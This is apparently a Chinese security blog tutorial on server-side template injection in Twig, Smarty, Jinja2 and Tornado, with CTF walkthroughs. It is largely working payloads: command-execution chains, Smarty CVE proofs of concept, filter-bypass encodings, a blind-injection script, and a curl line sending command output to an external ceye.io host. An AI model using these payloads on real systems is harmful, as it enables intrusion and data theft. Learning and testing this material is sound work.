---
title: SSTI（服务端模版注入）
date: 2022-7-25 21:03:38
tags: 
- Web
- Security
- XSS
categories: 
- web安全基础漏洞
---

# SSTI（服务端模版注入）

## 简介

### 模板引擎

模板引擎使开发者能够在应用程序中使用静态模板文件。 在运行时，模板引擎将模板文件中的变量替换为实际值，并将模板转换为发送给客户端的 HTML 文件。 这种方法使设计 HTML 页面变得更加容易。

### 数据绑定示例

在模板中，开发人员将为动态值定义静态内容和占位符。 在运行时，模板将由其引擎处理以映射模板中的动态值引用。

```
Hello {{Name}} !
```

在传入Name的值，经过引擎处理后的输出就是

![img]( https://image-bed-0.oss-cn-hongkong.aliyuncs.com/2022-07/截屏2022-07-23-下午2.41.24.png)

### 各种语言常见模版引擎

- C# (StringTemplate, ASPX which is used dynamically on Sharepoint)
- Java (Velocity, Freemarker, Pebble, Thymeleaf and Jinjava)
- PHP (Twig, Smarty, Dwoo, Volt, Blade, Plates, Mustache)
- Python (Jinja2, Tornado)
- Go (text/template)

### SSTI

SSTI，全称 Server Side Template Injection 服务端模板注入，这是由于开发人员的开发不当，让用户的输入成为了模版的一部分，从而使恶意代码注入到 Web 服务器执行命令，可借助或由 SSTI 导致 RCE 读取服务器上的敏感信息，因此这种漏洞通常很严重。

通过一个Twig的例子详细演示一下SSTI是怎么回事：

Twig 可能是 PHP 中最流行的模板库。 它是由非常流行的 PHP 框架 Synfony 的创建者开发的。可以使用composer在对应的目录安装：

```
composer require "twig/twig:^3.0"
```

安装完成后，新建一个index.php，写上下面的代码

```
<?php

require_once '/path/to/vendor/autoload.php'; // 添加引用

$loader = new \Twig\Loader\ArrayLoader([
    'index' => 'Hello {{ name }}!',
]);
$twig = new \Twig\Environment($loader);

echo $twig->render('index', ['name' => $_GET['name']]);
```

这是一个简单的程序，使用装载器 (`\Twig\Loader\ArrayLoader` )来定位模板，然后使用环境变量 (`\Twig\Environment` )存储其配置。 `render()` 方法的第一个参数为传递的模板，第二个参数为传递的变量，返回渲染后的内容。Twig将花括号 `{}` 作为变量或者语句的标识（参考：https://twig.symfony.com/doc/3.x/templates.html#variables）渲染的时候会将被 `{}` 包含的片段进行处理，例如变量替换，语句解析等等。

例如在这里，`Hello {{ name }}!` 这个字符串作为模版输入，`['name' => $_GET['name']]`数组作为渲染的参数输入，渲染的时候将 `{{ name }}` 替换为get请求参数中name的值，然后返回，内部会经过html的转义，所以这里是没有漏洞的。但是如果直接拼接字符串，就有会出现SSTI漏洞。例如下面的代码

```
<?php

require_once './vendor/autoload.php'; // 添加引用

$loader = new \Twig\Loader\ArrayLoader([
    'index' => 'Hello '.$_GET['name'].' !',
]);
$twig = new \Twig\Environment($loader);

echo $twig->render('index'); // 将loader中key为index的value拿去渲染，渲染完返回并输出页面
```

访问这个页面，请求参数name的值直接拼接字符串，把这个拼接成的字符串传入render中进行渲染，然后返回输出。因为是直接拼接字符串，所以没有经过Twig的html字符转义，可以进行XSS：

![img]( https://image-bed-0.oss-cn-hongkong.aliyuncs.com/2022-07/截屏2022-07-23-下午3.14.24.png)

同时，也可以输入构造Twig的语法进行其他操作，例如输入 `{{7*7}}` ，渲染时会进行一个计算：

![img]( https://image-bed-0.oss-cn-hongkong.aliyuncs.com/2022-07/截屏2022-07-23-下午3.23.29.png)

也可以构造语句来执行命令：

![img]( https://image-bed-0.oss-cn-hongkong.aliyuncs.com/2022-07/截屏2022-07-23-下午3.46.01.png)

不同的模版引擎构造的payload略有不同，部分payload只有特定版本的模版引擎才能使用。



## PHP中的SSTI

### Twig

#### 基础语法

##### 变量

应用程序将变量传入模板中进行处理，变量可以包含你能访问的属性或元素。你可以使用 `.` 来访问变量中的属性（方法或 PHP 对象的属性，或 PHP 数组单元），也可以使用所谓的 "subscript" 语法 `[]`:

```
{{ foo.bar }}
{{ foo['bar'] }}
```

##### 设置变量

可以为模板代码块内的变量赋值，赋值使用 [set](https://www.osgeo.cn/twig/tags/set.html) 标签：

```
{% set foo = 'foo' %}
{% set foo = [1, 2] %}
{% set foo = {'foo': 'bar'} %}
```

##### 过滤器

可以通过过滤器 filters 来修改模板中的变量。在过滤器中，变量与过滤器或多个过滤器之间使用 `|` 分隔，还可以在括号中加入可选参数。可以连接多个过滤器，一个过滤器的输出结果将用于下一个过滤器中。

下面这个过滤器的例子会剥去字符串变量 `name` 中的 HTML 标签，然后将其转化为大写字母开头的格式:

```
{{ name|striptags|title }}

// {{ '<a>whoami<a>'|striptags|title }}
// Output: Whoami!
```

下面这个过滤器将接收一个序列 `list`，然后使用 `join` 中指定的分隔符将序列中的项合并成一个字符串：

```
{{ list|join }}
{{ list|join(', ') }}

// {{ ['a', 'b', 'c']|join }}
// Output: abc

// {{ ['a', 'b', 'c']|join('|') }}
// Output: a|b|c
```

更多内置过滤器请参考：https://twig.symfony.com/doc/3.x/filters/index.html

##### 函数

在 Twig 模板中可以直接调用函数，用于生产内容。如下调用了 `range()` 函数用来返回一个包含整数等差数列的列表：

```
{% for i in range(0, 3) %}
    {{ i }},
{% endfor %}

// Output: 0, 1, 2, 3,
```

更多内置函数请参考：https://twig.symfony.com/doc/3.x/functions/index.html

##### 控制结构

控制结构是指控制程序流程的所有控制语句 `if`、`elseif`、`else`、`for` 等，以及程序块等等。控制结构出现在 `{% ... %}` 块中。

例如使用 `for` 标签进行循环：

```
<h1>Members</h1>
<ul>
    {% for user in users %}
        <li>{{ user.username|e }}</li>
    {% endfor %}
</ul>
```

`if` 标签可以用来测试表达式：

```
{% if users|length > 0 %}
    <ul>
        {% for user in users %}
            <li>{{ user.username|e }}</li>
        {% endfor %}
    </ul>
{% endif %}
```

更多 tags 请参考：https://twig.symfony.com/doc/3.x/tags/index.html

##### 引入其他模板

Twig 提供的 `include` 函数可以使你更方便地在模板中引入模板，并将该模板已渲染后的内容返回到当前模板：

```
{{ include('sidebar.html') }}
```

#### 利用方式

##### 使用 map 过滤器

在 Twig 3.x 中，`map` 这个过滤器可以允许用户传递一个[箭头函数](https://www.php.net/manual/zh/functions.arrow.php)，并将这个箭头函数应用于序列或映射的元素：

```
{% set people = [
    {first: "Bob", last: "Smith"},
    {first: "Alice", last: "Dupond"},
] %}

{{ people|map(p => "#{p.first} #{p.last}")|join(', ') }}
// Output: outputs Bob Smith, Alice Dupond


{% set people = {
    "Bob": "Smith",
    "Alice": "Dupond",
} %}

{{ people|map((last, first) => "#{first} #{last}")|join(', ') }}
// Output: outputs Bob Smith, Alice Dupond
```

当我们如下使用 `map` 时：

```
{{["Mark"]|map((arg)=>"Hello #{arg}!")}}
```

Twig 3.x 会将其编译成：

```
twig_array_map([0 => "Mark"], function ($__arg__) use ($context, $macros) { $context["arg"] = $__arg__; return ("hello " . ($context["arg"] ?? null))})
```

这个 `twig_array_map` 函数的源码如下：

```
function twig_array_map($array, $arrow)
{
    $r = [];
    foreach ($array as $k => $v) {
        $r[$k] = $arrow($v, $k);    // 直接将 $arrow 当做函数执行
    }

    return $r;
}
```

从上面的代码我们可以看到，传入的 `$arrow` 直接就被当成函数执行，即 `$arrow($v, $k)`，而 `$v` 和 `$k` 分别是 `$array` 中的 value 和 key。`$array` 和 `$arrow` 都是我们我们可控的，那我们可以不传箭头函数，直接传一个可传入两个参数的、能够命令执行的危险函数名即可实现命令执行。通过查阅常见的命令执行函数：

```
system ( string $command [, int &$return_var ] ) : string
passthru ( string $command [, int &$return_var ] )
exec ( string $command [, array &$output [, int &$return_var ]] ) : string
shell_exec ( string $cmd ) : string
```

前三个都可以使用。相应的 Payload 如下：

```
{{["id"]|map("system")}}
{{["id"]|map("passthru")}}
{{["id"]|map("exec")}}    // 无回显
```

其中，`{{["id"]|map("system")}}` 会被成下面这样：

```
twig_array_map([0 => "id"], "sysetm")
```

### Smarty

Smarty是一个使用PHP写出来的模板引擎，是目前业界最著名的PHP模板引擎之一。

#### 基础语法

##### 变量

```
{$foo}        <-- 显示简单的变量 (非数组/对象)
{$foo[4]}     <-- 在0开始索引的数组中显示第五个元素
{$foo.bar}    <-- 显示"bar"下标指向的数组值，等同于PHP的$foo['bar']
```

更多变量参考：https://www.smarty.net/docs/zh_CN/language.syntax.variables.tpl

##### 函数

`{for}` 语句

```
{for $foo=1 to 3}
    {$foo},
{/for}

// Output:1, 2, 3,
```

`{if}` 、`{ifelse}` 和 `{else}` 语句，每个 `{if}` 都要和一个 `{/if}` 相匹配

```
{if $logged_in}
    Welcome, <span>{$name}!</span>
{else}
    Please log in!
{/if}
```

更多内置函数参考：https://www.smarty.net/docs/zh_CN/language.builtin.functions.tpl

#### 利用方式

在注入点传入 `{$smarty.version}` 就能看见smarty版本号，这对接下来的利用有帮助

![img]( https://image-bed-0.oss-cn-hongkong.aliyuncs.com/2022-07/截屏2022-07-23-下午8.19.28.png)

##### PHP函数直接使用

```
{system('whoami')}
```

##### {literal} 标签

`{literal}...{/literal}` 内的任何标签都不会被解析，会保持原样输出。php7无法使用，但是对于php5的环境就可以使用如下脚本

```
{literal}<script language="php">phpinfo();</script>{/literal}
```

##### {include} 标签

`{include}` 标签引入的文件只会单纯的输出文件内容，就算引入 php 文件也是如此，例如

```
{include file='index.php'}
```

![img]( https://image-bed-0.oss-cn-hongkong.aliyuncs.com/2022-07/截屏2022-07-23-下午9.00.18.png)

虽然被不能完整的显示，但是还是可以看到读到了php代码

##### **获取类的静态方法**

我们可以通过 self 标签来获取 Smarty 类的静态方法，比如我们可以获取 getStreamVariable 方法来读文件：

```
{self::getStreamVariable("file:///etc/passwd")}
```

可以看到这个方法可以读取一个文件并返回其内容，但是在3.1.30的Smarty版本中官方已经把该静态方法删除。 对于那些文章提到的利用 Smarty_Internal_Write_File 类的writeFile方法来写shell也由于同样的原因无法使用。

##### CVE-2021-26120

- POC：`string:{function name='x(){};system(whoami);function '}{/function}`
- 漏洞原因：[{function}](https://www.smarty.net/docs/en/language.function.function.tpl) 标签的 name 属性可以通过精心构造注入恶意代码
- 版本限制：< 3.1.39

##### CVE-2021-29454

- POC：
  `eval:{math equation='("\163\171\163\164\145\155")("\167\150\157\141\155\151")'}`
- 漏洞原因：`libs/plugins/function.math.php` 中的 `smarty_function_math` 执行了 eval()，而 eval() 的数据可以通过 8 进制数字绕过正则表达式
- 版本限制：在 3.1.42 和 4.0.2 中修复，小于这两个版本可用

php 的 eval() 支持传入 8 或 16 进制数据，以下代码在 php7 版本都可以顺利执行，由于 php5 不支持 `(system)(whoami);` 这种方式执行代码，所以 php5 的 8 进制方式用不了：

```
eval('("\163\171\163\164\145\155")("\167\150\157\141\155\151");');
eval("\x73\x79\x73\x74\x65\x6d\x28\x77\x68\x6f\x61\x6d\x69\x29\x3b");
```



## Python中的SSTI

### Jinja

Jinja 是 Python 中流行的模板引擎。 它是一个与 Django 非常相似的模板。 与 Django 相比，Jinja 可以轻松地在运行时动态使用。

#### 基础语法

这里有几个简单的表达式来说明基本语法。

变量: `{{ ... }}`

语句: `{% ... %}`

过滤器: `{{ ...|... }}`

更多规则参考： [Jinja 官方文档](https://jinja.palletsprojects.com/en/3.1.x/templates/)

#### 利用方式

在Python里，所有的东西都是对象的概念。不同级别的对象有不同的内置属性。jinja 中是可以直接访问python的一些对象及其方法和内置属性的，所以可以通过内置属性和方法构造继承链来执行一些操作，比如文件读取，命令执行等。SSTI中常用内置属性：

**class**的内置属性：

`__dict__` ：类的静态函数、类函数、普通函数、全局变量以及一些内置的属性的键值对字典 

`__bases__` ：以元组形式返回一个类直接所继承的类（可以理解为直接父类）

`__base__` ：和上面的bases大概相同，都是返回当前类所继承的类，即基类，区别是base返回单个，bases返回是元组（__base__和__mro__都是用来寻找基类的） 

`__subclasses__`：以列表返回类的子类

`__init__` ：类的初始化方法

**instance**的内置属性：

`__class__` ：返回一个对象所属的类 

`__mro__` ：返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。 

**function**的内置属性：

`__globals__` ：返回函数所在的全局命名空间所定义的全局变量(包括class，module，function等)的字典

**module**的内置属性：

`__builtin__` && `__builtins__` ：python中可以直接运行一些函数，例如int()，list()等等。这些函数可以在__builtin__可以查到。查看的方法是dir(__builtins__)。在py3中__builtin__被换成了builtin

1. 在主模块main中，__builtins__是对内建模块__builtin__本身的引用，即__builtins__完全等价于__builtin__。　　　　　　　　　　　　　　　　　　
2. 非主模块main中，__builtins__仅是对__builtin__.__dict__的引用，而非__builtin__本身

例如可以通过 `__class__` 获取字典对象所属的类，再通过 `__base__` 拿到基类，然后使用`__subclasses__()` 获取子类列表：

```
for i in {}.__class__.__base__.__subclasses__():
    print(i.__name__)
```

上述代码如果按照jinja的规则就可以写成这样：

```
{% for item in {}.__class__.__base__.__subclasses__() %}
    "{{item.__name__}}"<br>
{% endfor %}
```

传入有漏洞的地方就能获取到类列表

![img]( https://image-bed-0.oss-cn-hongkong.aliyuncs.com/2022-07/截屏2022-07-24-下午4.55.47.png)

通过上述方式获取到类后，可以获取 `__init__` 函数，然后使用 `__globals__` 获取到全局变量，在全局变量中就包含 `__builtins__` 这个module，其中包含了内建函数，如chr，eval等。也可以直接使用内置方法，通过上述途径得到内建函数。这里用两种方法来演示

使用搜索到的类

```
{{{}.__class__.__base__.__subclasses__()[250].__init__.__globals__.__builtins__.eval('import "os" os.popen("ls").read()')}}

//假设250这个类的初始化函数所在__globals__不包含os模块。然后它就得使用内建函数eval来导入os模块来执行命令
```

flask方法 `lipsum` 自带os module，可以直接使用

```
{{lipsum.__globals__.os.popen('ls').read()}}
```

flask还有如下方法

```
url_for                url_for.__globals__含有current_app
get_flashed_messages   get_flashed_messages.__globals__含有current_app
lipsum                 lipsum.__globals__含有os模块：{{lipsum.__globals__['os'].popen('ls').read()}}
```

这里也提供一些可能会用到的变量/类：

```
current_app          应用上下文，一个全局变量。
request              可以用于获取字符串来绕过
config               当前application的所有配置。此外，也可以这样{{ config.__class__.__init__.__globals__['os'].popen('ls').read() }}

cycler               {{cycler.__init__.__globals__.os.popen('id').read()}}
joiner               {{joiner.__init__.__globals__.os.popen('id').read()}}
namespace            {{namespace.__init__.__globals__.os.popen('id').read()}}
```

##### 利用file对象读取文件

python2可用，python3已经移除内置file对象

```
for c in [].__class__.__base__.__subclasses__():
    if(c.__name__=='file'):
        print(c('flag.txt').readlines())
```

按照jinja2语法写：

```
{% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__=='file' %}
{{ c("flag.txt").readlines() }}
{% endif %}
{% endfor %}
```

读取文件

![img]( https://image-bed-0.oss-cn-hongkong.aliyuncs.com/2022-07/截屏2022-07-24-下午7.44.53.png)

##### 使用 subprocess.Popen 类执行命令

首先要找到这个类的索引，然后执行命令

```
{{().__class__.__base__.__subclasses__()[407]('whoami',shell=True,stdout=-1).communicate()[0]}}
```

##### 搜索想要的模块或函数

一般用 `__globals__` (func_globals等价)来搜索

```
#coding:utf-8
search = 'os'   #也可以是其他你想利用的模块
num = -1
for i in ().__class__.__bases__[0].__subclasses__():
    num += 1
    try:
        if search in i.__init__.__globals__.keys():
            print(i, num)
    except:
        pass 
```

![img]( https://image-bed-0.oss-cn-hongkong.aliyuncs.com/2022-07/截屏2022-07-24-下午10.45.15.png)

找到后构造变量

```
{{().__class__.__base__.__subclasses__()[137].__init__.__globals__.os.popen('whoami').read()}}
```

![img]( https://image-bed-0.oss-cn-hongkong.aliyuncs.com/2022-07/截屏2022-07-27-下午8.27.48.png)

#### 绕过过滤

##### 引号

**使用chr函数**

使用chr函数传入字符串，就可以不使用引号。但是jinja中不能直接使用chr之类的内置函数，得先获取到包含它的引用，可以搜索，也可以用flask的方法。这里用url_for方法。然后利用set语句自定义一个chr函数的引用

```
{% set chr=url_for.__globals__.__builtins__.chr %}
```

然后可以使用将字符串生成chr函数表达式的脚本，快速生成代码：

```
string='ls'
for c in string:
    print('chr({})~'.format(ord(c)),end='')

// Output:chr(108)+chr(115)+
```

最终的payload(注意加号 `+` 的url编码，或者使用~)：

```
{% set chr=url_for.__globals__.__builtins__.chr %}
{{url_for.__globals__.os.popen(chr(108)~chr(115)).read()}}
```

**使用request对象**

使用 `request` 对象可以获取传入的参数，将其传入需要使用引号输入字符串的地方。

```
request.args
request.cookies
request.headers
request.values
request.form
```

如果过滤了args，可以将其中的 `request.args` 改为其他变量，只要在相应的地方传入参数即可。传入的时候注意参数的名字，例如request.args.get就是不行的，因为已经是内置的方法了。

```
{{().__class__.__base__.__subclasses__()[407](request.args.cmd,shell=True,stdout=-1).communicate()[0]}}&cmd=ls
```

**使用config|string|list**

这是利用config变量中包含的字符，转成字符串，再转换成列表，通过索引就能获得config包含的所有字符里的单个字符。查看所有能从config里获得的字符：

```
{{config|string|list}}
```

然后使用~或者+连接，就能的到一定的字符串。不一定要使用config，用其他能访问到的变量也可以，只不过config包含的字符多。也可以配合chr使用，这样的话能获取所有ascii字符。

生成脚本

```
#coding:utf-8
def findCharInConfig(char,config):
    for i in range(len(config)):
        if(config[i]==char):
            return i
    return None

payload='ls'
config="<Config {'ENV': 'production', 'DEBUG': False, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None, 'PRESERVE_CONTEXT_ON_EXCEPTION': None, 'SECRET_KEY': None, 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(days=31), 'USE_X_SENDFILE': False, 'SERVER_NAME': None, 'APPLICATION_ROOT': '/', 'SESSION_COOKIE_NAME': 'session', 'SESSION_COOKIE_DOMAIN': None, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_HTTPONLY': True, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_SAMESITE': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH': None, 'SEND_FILE_MAX_AGE_DEFAULT': datetime.timedelta(seconds=43200), 'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False, 'EXPLAIN_TEMPLATE_LOADING': False, 'PREFERRED_URL_SCHEME': 'http', 'JSON_AS_ASCII': True, 'JSON_SORT_KEYS': True, 'JSONIFY_PRETTYPRINT_REGULAR': False, 'JSONIFY_MIMETYPE': 'application/json', 'TEMPLATES_AUTO_RELOAD': None, 'MAX_COOKIE_SIZE': 4093}>".lower()
for c in payload:
    print('(config|string|list).pop({}).lower()~'.format(findCharInConfig(c,config)),end='')
print()
```

最终的payload，不过还是建议配合chr使用，即用此方法生成chr函数，避免config里没有想要的字符。

```
{{().__class__.__base__.__subclasses__()[407]((config|string|list).pop(41).lower()~(config|string|list).pop(42).lower(),shell=True,stdout=-1).communicate()[0]}}
```

**使用dict+join**

```
dict(__globals__=a)|join
```

如上表达式就能返回字符串"__globals__"，也可以使字符分开：

```
dict(o=a,s=a)|join
```

返回的就是"os"

**利用内置过滤器产生任意字符**

这个方法利用的是构造出'%c'字符串，然后利用python的 `'%c'%(number)` 的语法来构造任意字符

利用flask的g对象，可以得到'%'：

```
{%set pc = g|lower|list|first|urlencode|first%}
```

然后得到'c'：

```
{%set c=dict(c=1).keys()|reverse|first%}
```

合并二者得到'%c'：

```
{%set udl=dict(a=pc,c=c).values()|join %}
```

之后可以得到任意字符：

```
{%set udl2=udl%(95)%}{{udl}}
```

合起来的payload就是：

```
{%set pc = g|lower|list|first|urlencode|first%}{%set c=dict(c=1).keys()|reverse|first%}{%set udl=dict(a=pc,c=c).values()|join %}{%set udl2=udl%(95)%}{{udl}}
```

##### 中括号

可以使用 `__getitem__()` 或者 `pop()` 方法

```
{{().__class__.__base__.__subclasses__().__getitem__(220)('whoami',shell=True,stdout=-1).communicate()}}
```

##### 下划线和点

jinja中可以使用如下方式获取属性

```
{{().__class__}}
{{()["__class__"]}}
{{()|attr("__class__")}}
{{getattr('',"__class__")}}
{{().__getattribute__("__class__")}} 实例、类、函数都具有的__getattribute__魔术方法。事实上，在实例化的对象进行.操作的时候（形如:a.xxx/a.xxx()）都会自动去调用__getattribute__方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。
```

根据实际情况可以配合request对象来使用，例如：

```
{% set v=request.values %}
{{()|attr(v.class)|attr(v.base)|attr(v.sub)()|attr(v.geti)(407)(v.cmd,shell=True,stdout=-1)|attr(v.com)()}}&class=__class__&base=__base__&sub=__subclasses__&geti=__getitem__&cmd=cat /flag&com=communicate
```

##### 双大括号

可以使用 `{% print() %}` 语句

```
{% print(().__class__.__base__.__subclasses__()[407]('whoami',shell=True,stdout=-1).communicate()[0]) %}
```

也可以使用 `{% if ... %}1{% endif %}` 配合 `os.popen` 和 `curl` 将执行结果外带（不外带的话无回显）出来：

```
{% if ''.__class__.__base__.__subclasses__()[59].__init__.func_globals.linecache.os.popen('ls /' %}1{% endif %}
```

还有for语句也可以，请发挥想象。

##### 数字

利用dict生成字典，然后join获取字典里key的字符串，再用length或者count获取长度。

```
{%set num=dict(aaaaaaaaaaaa=a)|join|length%}

// num=12
```

也可以使用unicode字符：`𝟎𝟏𝟐𝟑𝟒𝟓𝟔𝟕𝟖𝟗`，`𝟘𝟙𝟚𝟛𝟜𝟝𝟞𝟟𝟠𝟡`，`０１２３４５６７８９`

#### 盲注

一般是对单个字符进行判断，页面返回有是或者不是两种结果，根据页面返回判断。然后通过脚本获取所有字符。

可以用index方法，后面两个参数代表判断范围，如下whoami的结果的0-3index内有t就返回t在字符串中的位置，没有的话页面会返回错误。

```
{% lipsum.__globals__.os.popen('whoami').read().index("t",0,3) %}
```

也可以使用if语句，结果第一个字符是r页面就有1，不是则无。不使用 `==` 用 `in` 也可以。

```
{% if 'r' == lipsum.__globals__.os.popen('whoami').read()[0] %}Mark{% endif %}
```

提供一个脚本（用不同的payload需要对脚本稍加修改）：

```
import requests

#判断长度，方便后续结束请求
length=20
for i in range(1,100):
    payload='http://node4.buuoj.cn:26692/?name={%if().__class__.__base__.__subclasses__()[245]("whoami",shell=True,stdout=-1).communicate()[0]|string|length=='+str(i)+'%}Mark{%endif%}'
    res=requests.get(payload)
        #print(c,res.text)
    if 'Mark' in res.text:
        print('length:',i)
        length=i
        break



for i in range(0,length):
    for c in range(32,127):
        payload='http://node4.buuoj.cn:26692/?name={%if().__class__.__base__.__subclasses__()[245]("whoami",shell=True,stdout=-1).communicate()[0]['+str(i)+']=='+str(c)+'%}Mark{%endif%}'
        res=requests.get(payload)
        #print(c,res.text)
        if 'Mark' in res.text:
            print(chr(c),end='')
            break
```

也可以用外部平台例如ceye平台接收数据：

```
{% if lipsum.__globals__.os.popen("curl `whoami`.b182oj.ceye.io").read() ==1%}{% endif %}
```

这里提供一种不需要远程服务器，并且只需要发一次请求的payload。原理就是通过两个内部两个for循环来遍历每个字符。因为其他方式似乎无法得到反斜杠，所以cmd使用chr函数组装。

```
{% set chr=lipsum.__globals__.__builtins__.chr %}
{% set payload=lipsum.__globals__.os.popen('ls').read()%}

{%for i in range(payload|length)%}
<br>
{%for j in range(32,127)%}
{%if (payload[i])==chr(j)%}
*
{%endif%}
O
{%endfor%}
{%endfor%}
```

得到的结果再用如下脚本进行读取

```
input='''
OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO*OOOOOOOOOOOOOOOOOOOOOOOOOOOO
OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO*OOOOOOOOOOO
OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO*OOOOOOOOOOOOOOOOOOOOOOOOO
'''

for i in input.split('\n'):
    index=i.find('*')
    if(index>0):
        print(chr(index+32),end='')
```

![img]( https://image-bed-0.oss-cn-hongkong.aliyuncs.com/2022-07/截屏2022-07-28-下午12.49.08.png)



### Tornado

Tornado是一个流行的Python Web框架，Tornado 模板是 Tornado 框架的一部分。

#### 模板语法基础

```
{% ... %} for Statements 语句

{{ ... }} for Expressions to print to the template output 表达式
```

#### 利用方式

Tornado 的SSTI漏洞更容易被利用，因为它不仅支持类的访问，而且还支持python中的指令，例如 `import` 指令。 

可以直接导入 `os`模块并执行方法 `popen`：

```
{%import os%}
{{os.popen("whoami").read()}}
```



## JAVA中的SSTI

### velocity

Apache Velocity是一个基于Java的模板引擎，它提供了一个模板语言去引用由Java代码定义的对象。Velocity是Apache基金会旗下的一个开源软件项目，旨在确保Web应用程序在表示层和业务逻辑层之间的隔离（即MVC设计模式）。

#### 模板语法基础

**语句标识符**

\#用来标识Velocity的脚本语句，包括#set、#if、#else、#end、#foreach、#end、#include、#parse、#macro等语句。

**变量**

$用来标识一个变量，比如模板文件中为Hello $a，可以获取通过上下文传递的$a

**声明**

set用于声明Velocity脚本变量，变量可以在脚本中声明

```
#set($a ="velocity")
#set($b=1)
#set($arrayName=["1","2"])
```

**注释**

单行注释为##，多行注释为成对出现的#* ............. *#

**条件语句**

以if/else为例：

```
#if($foo<10)
    <strong>1</strong>
#elseif($foo==10)
    <strong>2</strong>
#elseif($bar==6)
    <strong>3</strong>
#else
    <strong>4</strong>
#end
```

**转义字符**

如果$a已经被定义，但是又需要原样输出$a，可以试用\转义作为关键的$

## 例题

可以通过这张图来判断服务器使用的是什么模版。

![模板注入](https://image-bed-0.oss-cn-hongkong.aliyuncs.com/2022-12/a98649c6cdc65546-20221215223714029.png)

![img]( https://image-bed-0.oss-cn-hongkong.aliyuncs.com/2022-07/截屏2022-07-25-下午9.15.49.png)

很明显，这里是jinja2或者twig，随便输入一点东西，通过报错的判断，发现是jinja2

![img]( https://image-bed-0.oss-cn-hongkong.aliyuncs.com/2022-07/截屏2022-07-25-下午9.17.28.png)

payload：

```
{{().__class__.__base__.__subclasses__()[407]('whoami',shell=True,stdout=-1).communicate()[0]}}
```

成功拿到flag

![img]( https://image-bed-0.oss-cn-hongkong.aliyuncs.com/2022-07/截屏2022-07-25-下午9.24.55.png)

### CISCN2019华东南赛区Web11

首先打开题目页面，有很明显的提示，用的是Smarty模版引擎。

![img]( https://image-bed-0.oss-cn-hongkong.aliyuncs.com/2022-07/截屏2022-07-25-下午9.33.51.png)

那么开始找注入点，页面上发现IP，结合下面的提示，用burp抓包添加个X-Forwarded-For头试试

![img]( https://image-bed-0.oss-cn-hongkong.aliyuncs.com/2022-07/截屏2022-07-25-下午9.39.29.png)

可见确实存在ssti漏洞。直接cat读取文件：`{system('cat /flag')}`

![img]( https://image-bed-0.oss-cn-hongkong.aliyuncs.com/2022-07/截屏2022-07-25-下午9.46.17.png)

## 参考文章

https://blog.csdn.net/cadi2011/article/details/94569757

https://www.cnblogs.com/bmjoker/p/13508538.html

https://xz.aliyun.com/t/7518#toc-0

https://xz.aliyun.com/t/11108

https://xz.aliyun.com/t/10056#toc-12

https://gosecure.github.io/template-injection-workshop/#0

https://xz.aliyun.com/t/11090#toc-7

https://xz.aliyun.com/t/9584#toc-24

https://www.freebuf.com/articles/network/258136.html

[http://diego.team/2020/11/19/Flask-jinja2-%E5%86%85%E7%BD%AE%E8%BF%87%E6%BB%A4%E5%99%A8-%E6%80%BB%E7%BB%93%E4%B8%8E%E5%88%86%E6%9E%90/](http://diego.team/2020/11/19/Flask-jinja2-内置过滤器-总结与分析/)

https://www.anquanke.com/post/id/246094